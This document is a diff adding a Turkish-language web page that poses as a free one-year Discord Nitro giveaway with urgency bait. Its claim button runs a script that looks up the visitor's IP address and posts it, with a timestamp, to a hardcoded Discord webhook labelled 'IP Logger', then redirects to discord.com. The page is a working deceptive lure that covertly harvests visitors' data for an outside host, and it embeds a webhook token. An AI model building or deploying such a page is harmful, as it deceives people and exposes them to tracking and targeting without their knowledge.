@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Discord Nitro Ücretsiz!</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      text-align: center;
+      background: linear-gradient(135deg, #5865F2, #7289DA);
+      color: white;
+      margin: 0;
+      padding: 50px;
+    }
+    h1 {
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 18px;
+      margin-bottom: 30px;
+    }
+    button {
+      padding: 18px 50px;
+      font-size: 24px;
+      font-weight: bold;
+      background: #43B581;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      transition: 0.3s;
+    }
+    button:hover {
+      background: #3CA374;
+      transform: translateY(-3px);
+    }
+    .loading {
+      display: none;
+      margin-top: 20px;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🎉 Discord Nitro 1 Yıl ÜCRETSİZ!</h1>
+  <p>Son 3 hediye kaldı! Hemen talep et!</p>
+  <button id="claimBtn" onclick="claimNitro()">HEMEN AL</button>
+  <div class="loading" id="loading">IP alınıyor ve gönderiliyor...</div>
+
+  <script>
+    function claimNitro() {
+      const btn = document.getElementById('claimBtn');
+      const loading = document.getElementById('loading');
+      
+      btn.disabled = true;
+      btn.textContent = "Gönderiliyor...";
+      loading.style.display = "block";
+
+      // IP adresini al
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const time = new Date().toLocaleString('tr-TR');
+
+          // Discord webhook'a gönder
+          return fetch('https://discord.com/api/webhooks/1433209697372078235/eXJ9I-LMfE6p2wNgBZZNNFWdmCtQ0YHzfaPjkHw-9Jle-ZEgzs14lf-HRl72uxxA34L5', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              content: null,
+              embeds: [{
+                title: "YENİ NİTRO TIKLANDI!",
+                color: 5814783,
+                fields: [
+                  { name: "IP Adresi", value: ip, inline: true },
+                  { name: "Zaman", value: time, inline: true }
+                ],
+                footer: { text: "IP Logger • Basit ve Etkili" }
+              }]
+            })
+          });
+        })
+        .then(() => {
+          // Başarılı → Discord'a yönlendir
+          setTimeout(() => {
+            window.location.href = 'https://discord.com';
+          }, 1000);
+        })
+        .catch(err => {
+          console.error('Hata:', err);
+          alert('Bir hata oluştu, lütfen tekrar dene.');
+          btn.disabled = false;
+          btn.textContent = "HEMEN AL";
+          loading.style.display = "none";
+        });
+    }
+  </script>
+
+</body>
+</html>
